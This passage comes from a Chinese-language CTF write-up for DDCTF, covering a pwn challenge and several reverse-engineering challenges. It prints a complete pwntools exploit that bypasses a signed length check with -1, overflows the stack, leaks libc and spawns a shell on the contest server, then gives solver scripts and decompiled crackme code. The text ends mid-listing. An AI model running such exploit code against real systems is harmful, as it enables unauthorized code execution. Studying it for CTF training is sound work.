class=\"line\">0xffffcf1c│+0x001c: 0x00000000</span><br><span class=\"line\">0xffffcf20│+0x0020: 0xf7ffda74  →  0xf7fd3470  →  0xf7ffd918  →  0x00000000</span><br><span class=\"line\">0xffffcf24│+0x0024: 0xf7e0bcc8  →  0x000029d0</span><br><span class=\"line\">0xffffcf28│+0x0028: 0xf7e5f21b  →  &lt;setbuffer+11&gt; add ebx, 0x151de5</span><br><span class=\"line\">0xffffcf2c│+0x002c: 0x00000000</span><br><span class=\"line\">0xffffcf30│+0x0030: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf34│+0x0034: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf38│+0x0038: 0xffffcfc8  →  0x00000000 &lt;= main函数的ebp地址</span><br><span class=\"line\">0xffffcf3c│+0x003c: 0xf7e65005  →  &lt;setbuf+21&gt; add esp, 0x1c &lt;= libc地址</span><br><span class=\"line\">0xffffcf40│+0x0040: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">0xffffcf44│+0x0044: 0x00000000</span><br><span class=\"line\">0xffffcf48│+0x0048: 0x00002000</span><br><span class=\"line\">0xffffcf4c│+0x004c: 0xf7e64ff0  →  &lt;setbuf+0&gt; sub esp, 0x10</span><br><span class=\"line\">0xffffcf50│+0x0050: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">0xffffcf54│+0x0054: 0xf7ffd918  →  0x00000000</span><br><span class=\"line\">0xffffcf58│+0x0058: 0xffffcfc8  →  0x00000000\t ← $ebp</span><br></pre></td></tr></table></figure>\n<p>然后考虑如何劫持控制流。这里注意，虽然在检查长度时会强制转换为有符号数，但是在read函数传参时仍旧把nbytes当作无符号数，所以如果输入负数，就可以绕过长度检查，实现任意长度的栈溢出。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nbytes = read_num();</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)nbytes &gt; <span class=\"number\">63</span> )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"built_in\">puts</span>(<span class=\"string\">\"Too long!\"</span>);</span><br><span class=\"line\">   <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"Enter password(lenth %u): \"</span>, nbytes);</span><br><span class=\"line\"> v1 = fileno(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\"> read(v1, &amp;buf, nbytes); &lt;= IO2BO</span><br></pre></td></tr></table></figure>\n<p>但是main函数返回的栈桢操作比较特殊，在main函数返回之前的汇编语句如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:08048735                 mov     eax, 0</span><br><span class=\"line\">.text:0804873A                 lea     esp, [ebp-8]</span><br><span class=\"line\">.text:0804873D                 pop     ecx</span><br><span class=\"line\">.text:0804873E                 pop     ebx</span><br><span class=\"line\">.text:0804873F                 pop     ebp</span><br><span class=\"line\">.text:08048740                 lea     esp, [ecx-4]</span><br><span class=\"line\">.text:08048743                 retn</span><br></pre></td></tr></table></figure>\n<p>首先令esp指向ebp-8处，然后分别pop三次给ecx, ebx和ebp，最后将esp指向ecx-4处，然后retn，也就是将eip转到ecx-4处开始执行代码。所以我们需要在ebp-8处布置栈，令esp和ebp均指向我们构造的栈桢处。直接看exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = p32(system) <span class=\"comment\"># [ebp - 0x4c]</span></span><br><span class=\"line\">payload += p32(main) <span class=\"comment\"># fake ebp of system [ebp - 0x4c + 4]</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">12</span>) <span class=\"comment\"># arg1:the addr of /bin/sh [ebp - 0x4c + 8]</span></span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span> <span class=\"comment\"># [ebp - 0x4c + 12]</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x4c</span> - <span class=\"number\">0x8</span> , <span class=\"string\">\"a\"</span>) <span class=\"comment\"># padding to [ebp - 8]</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>) <span class=\"comment\"># ecx = target_addr + 4</span></span><br><span class=\"line\">payload += <span class=\"string\">\"aaaa\"</span> <span class=\"comment\"># ebx</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>) <span class=\"comment\"># fake ebp</span></span><br></pre></td></tr></table></figure>\n<p>最终完整的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./xpwn\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"116.85.48.105\"</span>,<span class=\"string\">\"5005\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc.so.6\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"username: \"</span>)</span><br><span class=\"line\">payload = <span class=\"number\">10</span> * <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">stack_addr = u32(p.recvuntil(<span class=\"string\">\"\\xff\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)</span><br><span class=\"line\">leak = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = leak - libc.symbols[<span class=\"string\">'_IO_2_1_stdout_'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"><span class=\"comment\"># binsh = next(libc.search(\"/bin/sh\"))</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"password: \"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"-1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"): \"</span>)</span><br><span class=\"line\">main = <span class=\"number\">0x804862d</span></span><br><span class=\"line\">payload = p32(system)</span><br><span class=\"line\">payload += p32(main)</span><br><span class=\"line\"><span class=\"comment\"># payload += p32(binsh)</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">12</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x4c</span> - <span class=\"number\">0x8</span> , <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">All done, bye!</span><br><span class=\"line\">$ cat flag</span><br><span class=\"line\">DDCTF&#123;s0_3asy_St4ck0verfl0w_r1ght?&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"RE\"><a href=\"#RE\" class=\"headerlink\" title=\"RE\"></a>RE</h1><h2 id=\"RE1\"><a href=\"#RE1\" class=\"headerlink\" title=\"RE1\"></a>RE1</h2><p>本题相当简单，是RE的签到题，就是一个字符匹配，写脚本迭代即可。直接upx脱壳。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">magic = <span class=\"string\">\"~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;%$#\\\"!\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">target = <span class=\"string\">\"DDCTF&#123;reverseME&#125;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">base_addr = <span class=\"number\">0x402ff8</span></span><br><span class=\"line\">first_addr = <span class=\"number\">0x403018</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> target:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(magic)):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> magic[i] == ch:</span><br><span class=\"line\">\t\t\tflag += chr(i + first_addr - base_addr)</span><br><span class=\"line\"><span class=\"keyword\">print</span> flag</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<p>DDCTF{ZZ[JX#,9(9,+9QY!}</p>\n<h2 id=\"RE2\"><a href=\"#RE2\" class=\"headerlink\" title=\"RE2\"></a>RE2</h2><p>本题也不算难，只是需要比上题多一点的逆向功底，可以说上题只靠调试器就能解决了。该题首先将16进制字符串解码，然后base64编码，令编码后的结果为”reserse+”即可。这里在二进制文件中并没有base64的那个明显的字符串，但是有一个64位的字符串很可疑，最后调试发现其实就是标准的base64算法。</p>\n<p>对了，本题也加了壳，但是我记得似乎不能用upx直接脱壳，用esp定律即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target = <span class=\"string\">\"reverse+\"</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">print</span> b64decode(target).encode(<span class=\"string\">\"hex\"</span>).upper()</span><br></pre></td></tr></table></figure>\n<p>flag如下：<br>DDCTF{ADEBDEAEC7BE}</p>\n<h2 id=\"Confused\"><a href=\"#Confused\" class=\"headerlink\" title=\"Confused\"></a>Confused</h2><p>本题是一道macos逆向题，这是我第一次做macOS的逆向，但其实逆向的思路都是一样的。右键点击app（当然要在osx系统下）文件，选择显示包内容，然后在/Contents/MacOS/路径下就能找到可执行文件。其实我们可以直接用IDA打开这个文件进行反汇编，然后用llgb（类似gdb）加载这个文件进行动态调试。</p>\n<p>简单看一下，发现核心逻辑就在checkCode函数中。</p>\n<p>函数首先检查flag是否以”DDCTF{“开头，然后检查最后一位是否为”}”，然后用substringWithRange函数获取花括号包裹的字符串，如果它的长度为18，则合法，且转为UTF8String。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> __cdecl -[ViewController checkCode:](ViewController *self, SEL a2, id a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v4; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v5; <span class=\"comment\">// ST18_8</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v6; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v7; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v8; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v9; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v10; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v11; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v12; <span class=\"comment\">// [rsp+38h] [rbp-58h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v13; <span class=\"comment\">// [rsp+40h] [rbp-50h]</span></span><br><span class=\"line\">  __int128 v14; <span class=\"comment\">// [rsp+48h] [rbp-48h]</span></span><br><span class=\"line\">  __int64 v15; <span class=\"comment\">// [rsp+58h] [rbp-38h]</span></span><br><span class=\"line\">  SEL v16; <span class=\"comment\">// [rsp+60h] [rbp-30h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v17; <span class=\"comment\">// [rsp+68h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v18; <span class=\"comment\">// [rsp+70h] [rbp-20h]</span></span><br><span class=\"line\">  __int64 v19; <span class=\"comment\">// [rsp+78h] [rbp-18h]</span></span><br><span class=\"line\">  __int64 v20; <span class=\"comment\">// [rsp+80h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v21; <span class=\"comment\">// [rsp+88h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v17 = self;</span><br><span class=\"line\">  v16 = a2;</span><br><span class=\"line\">  v15 = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v15, (__int64)a3);</span><br><span class=\"line\">  v3 = objc_msgSend(v17, <span class=\"string\">\"pwd\"</span>);</span><br><span class=\"line\">  v4 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v3);</span><br><span class=\"line\">  v5 = v4;</span><br><span class=\"line\">  v6 = objc_msgSend(v4, <span class=\"string\">\"stringValue\"</span>);</span><br><span class=\"line\">  v14 = (<span class=\"keyword\">unsigned</span> __int64)objc_retainAutoreleasedReturnValue((__int64)v6);</span><br><span class=\"line\">  objc_release(v5);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> __int8)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"hasPrefix:\"</span>, CFSTR(<span class=\"string\">\"DDCTF&#123;\"</span>)) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v7 = (<span class=\"keyword\">char</span> *)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"length\"</span>);</span><br><span class=\"line\">    v8 = objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"substringFromIndex:\"</span>, v7 - <span class=\"number\">1</span>);</span><br><span class=\"line\">    v13 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v8);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> __int8)objc_msgSend(v13, <span class=\"string\">\"isEqualToString:\"</span>, CFSTR(<span class=\"string\">\"&#125;\"</span>)) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v9 = (<span class=\"keyword\">char</span> *)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"length\"</span>);</span><br><span class=\"line\">      v19 = <span class=\"number\">6L</span>L;</span><br><span class=\"line\">      v18 = v9 - <span class=\"number\">7</span>;</span><br><span class=\"line\">      v20 = <span class=\"number\">6L</span>L;</span><br><span class=\"line\">      v21 = v9 - <span class=\"number\">7</span>;</span><br><span class=\"line\">      v10 = objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"substringWithRange:\"</span>, <span class=\"number\">6L</span>L, v9 - <span class=\"number\">7</span>);</span><br><span class=\"line\">      v12 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v10);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( objc_msgSend(v12, <span class=\"string\">\"length\"</span>) == (<span class=\"keyword\">void</span> *)<span class=\"number\">18</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v11 = (<span class=\"keyword\">void</span> *)objc_retainAutorelease(v12);</span><br><span class=\"line\">        *((_QWORD *)&amp;v14 + <span class=\"number\">1</span>) = objc_msgSend(v11, <span class=\"string\">\"UTF8String\"</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      objc_storeStrong((__int64)&amp;v12, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    objc_storeStrong((__int64)&amp;v13, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *((_QWORD *)&amp;v14 + <span class=\"number\">1</span>) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)sub_1000011D0(*((__int64 *)&amp;v14 + <span class=\"number\">1</span>)) == <span class=\"number\">1</span> )</span><br><span class=\"line\">      objc_msgSend(v17, <span class=\"string\">\"onSuccess\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      objc_msgSend(v17, <span class=\"string\">\"onFailed\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    objc_msgSend(v17, <span class=\"string\">\"onFailed\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v14, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v15, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在sub_100001f60中，对一个结构体进行了初始化，填充了一些常量和函数指针，这个结构体是该题的核心。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001F60</span><span class=\"params\">(__int64 result, __int64 a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  *(_DWORD *)result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">4</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">8</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">12</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">16</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">176</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">32</span>) = <span class=\"number\">-16</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">40</span>) = sub_100001D70;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">48</span>) = <span class=\"number\">-15</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">56</span>) = sub_100001A60;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">64</span>) = <span class=\"number\">-14</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">72</span>) = sub_100001AA0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">80</span>) = <span class=\"number\">-12</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">88</span>) = sub_100001CB0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">96</span>) = <span class=\"number\">-11</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">104</span>) = sub_100001CF0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">112</span>) = <span class=\"number\">-13</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">120</span>) = sub_100001B70;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">128</span>) = <span class=\"number\">-10</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">136</span>) = sub_100001B10;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">144</span>) = <span class=\"number\">-9</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">152</span>) = sub_100001D30;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">160</span>) = <span class=\"number\">-8</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">168</span>) = sub_100001C60;</span><br><span class=\"line\">  qword_100003F58 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x400</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __memcpy_chk((<span class=\"keyword\">char</span> *)qword_100003F58 + <span class=\"number\">48</span>, a2, <span class=\"number\">18L</span>L, <span class=\"number\">-1L</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由上述，逆向得到结构体中的关键变量如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">  DWORD num0; <span class=\"comment\">// + 0</span></span><br><span class=\"line\">  DWORD num4; <span class=\"comment\">// + 4</span></span><br><span class=\"line\">  DWORD num8; <span class=\"comment\">// + 8</span></span><br><span class=\"line\">  DWORD num12; <span class=\"comment\">// + 12</span></span><br><span class=\"line\">  DWORD flag; <span class=\"comment\">// + 16</span></span><br><span class=\"line\">  DWORD result; <span class=\"comment\">// + 176</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>结构体中其他字段为常数和常量函数指针，后续算法中这些常数和函数指针是一一对应的。常数分别为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array = [<span class=\"number\">0xf0</span>, <span class=\"number\">0xf1</span>, <span class=\"number\">0xf2</span>, <span class=\"number\">0xf4</span>, <span class=\"number\">0xf5</span>, <span class=\"number\">0xf3</span>, <span class=\"number\">0xf6</span>, <span class=\"number\">0xf7</span>, <span class=\"number\">0xf8</span>]</span><br></pre></td></tr></table></figure>\n<p>最后在0x100001f00中，首先令结构体的0x24偏移处指向一块内存区域，然后循环调用sub_100001e50。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001F00</span><span class=\"params\">(__int64 myclass)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  *(_QWORD *)(myclass + <span class=\"number\">24</span>) = (<span class=\"keyword\">char</span> *)&amp;loc_100001980 + <span class=\"number\">4</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( **(<span class=\"keyword\">unsigned</span> __int8 **)(myclass + <span class=\"number\">24</span>) != <span class=\"number\">243</span> )</span><br><span class=\"line\">    sub_100001E50(myclass);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(qword_100003F58);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)(myclass + <span class=\"number\">176</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>sub_100001e50的f5代码如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span 